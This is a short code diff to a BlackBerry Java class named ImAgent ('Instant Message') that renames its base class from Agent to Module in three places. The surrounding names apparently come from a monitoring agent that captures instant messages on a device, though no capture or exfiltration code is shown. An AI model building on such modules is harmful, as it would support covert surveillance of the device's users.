@@ -32,7 +32,7 @@ import blackberry.utils.WChar;
 /**
  * Instant Message.
  */
-public final class ImAgent extends Agent implements BacklightObserver,
+public final class ImAgent extends Module implements BacklightObserver,
         ApplicationObserver {
     //#ifdef DEBUG
     static Debug debug = new Debug("ImAgent", DebugLevel.VERBOSE);
@@ -54,7 +54,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
      *            the agent status
      */
     public ImAgent(final boolean agentEnabled) {
-        super(Agent.AGENT_IM, agentEnabled, Conf.AGENT_IM_ON_SD, "ImAgent");
+        super(Module.AGENT_IM, agentEnabled, Conf.AGENT_IM_ON_SD, "ImAgent");
 
         if(!Device.getInstance().atLeast(5, 0)){
             //#ifdef DEBUG
@@ -118,7 +118,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
     }
 
     public static ImAgent getInstance() {
-        return (ImAgent) AgentManager.getInstance().getItem(Agent.AGENT_IM);
+        return (ImAgent) AgentManager.getInstance().getItem(Module.AGENT_IM);
     }
 
     public synchronized void actualStart() {
